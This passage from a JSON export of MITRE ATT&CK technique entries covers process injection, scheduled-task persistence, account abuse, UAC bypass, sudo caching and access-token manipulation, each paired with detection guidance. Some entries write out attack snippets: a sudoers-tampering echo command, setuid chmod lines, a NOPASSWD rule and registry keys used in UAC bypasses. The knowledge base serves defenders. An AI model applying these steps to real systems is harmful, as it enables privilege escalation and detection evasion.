        "description": " \nAdversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.  \nTo ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.  \nTo avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.  \n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.  \n\nAdversaries may abuse TxF to a perform a file-less variation of  Process Injection . Similar to  Process Hollowing , process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as  NtUnmapViewOfSection ,  VirtualProtectEx , and  SetThreadContext .  \n\nProcess Doppelgänging is implemented in 4 steps  \n: Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction. Load – Create a shared section of memory and load the malicious executable. Rollback – Undo changes to original executable, effectively removing malicious code from the file system. Animate – Create a process from the tainted section of memory and initiate execution. \nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitor and analyze calls to CreateTransaction, CreateFileTransacted, RollbackTransaction, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to NtCreateProcessEx and NtCreateThreadEx as well as API calls used to modify memory within another process, such as WriteProcessMemory.    Scan file objects reported during the PsSetCreateProcessNotifyRoutine,   which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access.   Also consider comparing file objects loaded in memory to the corresponding file on disk.  Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.\n\n"
      },
      "T1055.014": {
        "name": "VDSO Hijacking",
        "description": " \nAdversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via  Ptrace System Calls . However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).  \n  \n  \n  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1053": {
        "name": "Scheduled Task/Job",
        "description": " \nAdversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.  \n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).  ",
        "detection": "\nMonitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1053.001": {
        "name": "At (Linux)",
        "description": " \nAdversaries may abuse the  at utility to perform task scheduling for initial or recurring execution of malicious code. The  at command within Linux operating systems enables administrators to schedule tasks.  \n\nAn adversary may use  at in Linux environments to execute programs at system startup or on a scheduled basis for persistence.  at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.  ",
        "detection": "\nMonitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1053.002": {
        "name": "At (Windows)",
        "description": " \nAdversaries may abuse the  at.exe utility to perform task scheduling for initial or recurring execution of malicious code. The  at utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using  at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. \nAn adversary may use  at.exe in Windows environments to execute programs at system startup or on a scheduled basis for persistence.  at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM). \nNote: The  at.exe command line utility has been deprecated in current versions of Windows in favor of  schtasks .  ",
        "detection": "\nMonitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows.   If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.Configure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service.   Several events will then be logged on scheduled task activity, including:   Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registeredEvent ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updatedEvent ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deletedEvent ID 4698 on Windows 10, Server 2016 - Scheduled task createdEvent ID 4700 on Windows 10, Server 2016 - Scheduled task enabledEvent ID 4701 on Windows 10, Server 2016 - Scheduled task disabledTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.  Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\n"
      },
      "T1053.003": {
        "name": "Cron",
        "description": " \nAdversaries may abuse the  cron utility to perform task scheduling for initial or recurring execution of malicious code. The  cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any  crontab files are stored in operating system-specific file paths. \nAn adversary may use  cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence.  cron can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.  ",
        "detection": "\nMonitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. \n\n"
      },
      "T1053.004": {
        "name": "Launchd",
        "description": " \nAdversaries may abuse the  Launchd daemon to perform task scheduling for initial or recurring execution of malicious code. The  launchd daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in  /System/Library/LaunchDaemons and  /Library/LaunchDaemons   \n. These LaunchDaemons have property list files which point to the executables that will be launched  \n. \nAn adversary may use the  launchd daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence.  launchd can also be abused to run a process under the context of a specified account. Daemons, such as  launchd , run with the permissions of the root user account, and will operate regardless of which user account is logged in.  ",
        "detection": "\nMonitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1053.005": {
        "name": "Scheduled Task",
        "description": " \nAdversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The  schtasks can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task. \nThe deprecated  at utility could also be abused by adversaries (ex:  At (Windows) ), though  at.exe can not access tasks created with  schtasks or the Control Panel. \nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).  ",
        "detection": "\nMonitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows.   If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.Configure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service.   Several events will then be logged on scheduled task activity, including:   Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registeredEvent ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updatedEvent ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deletedEvent ID 4698 on Windows 10, Server 2016 - Scheduled task createdEvent ID 4700 on Windows 10, Server 2016 - Scheduled task enabledEvent ID 4701 on Windows 10, Server 2016 - Scheduled task disabledTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.  Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\n"
      },
      "T1053.006": {
        "name": "Systemd Timers",
        "description": " \nAdversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension  .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to  Cron in Linux environments.  \n\nEach  .timer file must have a corresponding  .service file with the same name, e.g.,  example.timer and  example.service .  .service files are  Systemd Service unit files that are managed by the systemd system and service manager.  \nPrivileged timers are written to  /etc/systemd/system/ and  /usr/lib/systemd/system while user level are written to  ~/.config/systemd/user/ . \nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.  \n \n \nTimers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.  ",
        "detection": "\nSystemd timer unit files may be detected by auditing file creation and modification events within the /etc/systemd/system, /usr/lib/systemd/system/, and ~/.config/systemd/user/ directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.Suspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: systemctl list-timers –all. Analyze the contents of corresponding .service files present on the file system and ensure that they refer to legitimate, expected executables.Audit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers. \n\n"
      },
      "T1078": {
        "name": "Valid Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence. \nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.  \n ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.   Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\n\n"
      },
      "T1078.001": {
        "name": "Default Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.  \n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen  Private Keys or credential materials to legitimately connect to remote environments via  Remote Services .  \n ",
        "detection": "\nMonitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\n\n"
      },
      "T1078.002": {
        "name": "Domain Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.  \nDomain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.  \n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as  OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.  ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.  Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Perform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.\n\n"
      },
      "T1078.003": {
        "name": "Local Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \nLocal Accounts may also be abused to elevate privileges and harvest credentials through  OS Credential Dumping . Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.  ",
        "detection": "\nPerform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.\n\n"
      },
      "T1078.004": {
        "name": "Cloud Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.  \n \n \n\nCompromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a  Trusted Relationship . Similar to  Domain Accounts , compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.  ",
        "detection": "\nMonitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.\n\n"
      }
    }
  },
  "TA0005": {
    "name": "Defense Evasion",
    "description": "\nThe adversary is trying to avoid being detected.Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. \n",
    "technique": {
      "T1548": {
        "name": "Abuse Elevation Control Mechanism",
        "description": " \nAdversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.  ",
        "detection": "\nMonitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL Search Order Hijacking, which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).Consider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the LOG_INPUT and LOG_OUTPUT directives in the /etc/sudoers file.There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes.\n\n"
      },
      "T1548.001": {
        "name": "Setuid and Setgid",
        "description": " \nAn adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively.  \n. Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. \nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via  ls -l . The  chmod program can set these bits with via bitmasking,  chmod 4777 [file] or via shorthand naming,  chmod u+s [file] . \nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.  \n.  ",
        "detection": "\nMonitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.\n\n"
      },
      "T1548.002": {
        "name": "Bypass User Account Control",
        "description": " \nAdversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.  \n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated  Component Object Model objects without prompting the user through the UAC notification box.  \n  \nAn example of this is use of  Rundll32 to load a specifically crafted DLL which loads an auto-elevated  Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.  \n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods  \nthat have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:  eventvwr.exe can auto-elevate and execute a specified binary or script.  \n \n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.  \n ",
        "detection": "\nThere are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL Search Order Hijacking, which indicate attempts to gain access to higher privileged processes.Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:The eventvwr.exe bypass uses the [HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command Registry key. The sdclt.exe bypass uses the [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe and [HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand Registry keys.  Analysts should monitor these Registry settings for unauthorized changes.\n\n"
      },
      "T1548.003": {
        "name": "Sudo and Sudo Caching",
        "description": " \nAdversaries may perform sudo caching and/or use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges. \nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The  sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"  \nSince sudo was made for the system administrator, it has some useful configuration features such as a  timestamp_timeout , which is the amount of time in minutes between instances of  sudo before it will re-prompt for a password. This is because  sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at  /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a  tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again). \nThe sudoers file,  /etc/sudoers , describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like  user1 ALL=(ALL) NOPASSWD: ALL   \n. Elevated privileges are required to edit this file though. \nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example,  /var/db/sudo 's timestamp can be monitored to see if it falls within the  timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if  tty_tickets is disabled, adversaries can do this from any tty for that user. \nIn the wild, malware has disabled  tty_tickets to potentially make scripting easier by issuing  echo \\'Defaults !tty_tickets\\' >> /etc/sudoers   \n. In order for this change to be reflected, the malware also issued  killall Terminal . As of macOS Sierra, the sudoers file has  tty_tickets enabled by default.  ",
        "detection": "\nOn Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the LOG_INPUT and LOG_OUTPUT directives in the /etc/sudoers file.\n\n"
      },
      "T1548.004": {
        "name": "Elevated Execution with Prompt",
        "description": " \nAdversaries may leverage the  AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.  \nThe purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges. \nAdversaries may abuse  AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.  \n \n \nThis technique may be combined with  Masquerading to trick the user into granting escalated privileges to malicious code.  \n \nThis technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.  \n ",
        "detection": "\nConsider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\n\n"
      },
      "T1134": {
        "name": "Access Token Manipulation",
        "description": " \nAdversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. \nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e.  Token Impersonation/Theft ) or used to spawn a new process (i.e.  Create Process with Token ). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.  \n\nAny standard user can use the  runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.  ",
        "detection": "\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. There are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., LogonUser  , DuplicateTokenEx , and ImpersonateLoggedOnUser ). Please see the referenced Windows API pages for more information.Query systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account. Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.\n\n"
      },
      "T1134.001": {
        "name": "Token Impersonation/Theft",
        "description": " \nAdversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using  DuplicateToken(Ex) . The token can then be used with  ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with  SetThreadToken to assign the impersonated token to a thread. \nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.  ",
        "detection": "\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. Analysts can also monitor for use of Windows APIs such as DuplicateToken(Ex),  ImpersonateLoggedOnUser , and  SetThreadToken  and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\n"
      },
      "T1134.002": {
        "name": "Create Process with Token",
        "description": " \nAdversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with  DuplicateToken(Ex) and use it with  CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.  ",
        "detection": "\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.Analysts can also monitor for use of Windows APIs such as DuplicateToken(Ex) and CreateProcessWithTokenW and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\n"
      },
      "T1134.003": {
        "name": "Make and Impersonate Token",
        "description": " \nAdversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the  LogonUser function. The function will return a copy of the new session's access token and the adversary can use  SetThreadToken to assign the token to a thread.  ",
        "detection": "\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows. If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.Analysts can also monitor for use of Windows APIs such as LogonUser and  SetThreadToken and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\n"
      },
      "T1134.004": {
        "name": "Parent PID Spoofing",
        "description": " \nAdversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the  CreateProcess API call, which supports a parameter that defines the PPID to use.  \nThis functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via  svchost.exe or  consent.exe ) rather than the current user context.  \n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of  PowerShell /  Rundll32 to be  explorer.exe rather than an Office document delivered as part of  Spearphishing Attachment .  \nThis spoofing could be executed via  Visual Basic within a malicious Office document or any code that can perform  Native API .  \n \n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as  lsass.exe ), causing the new process to be elevated via the inherited access token.  \n ",
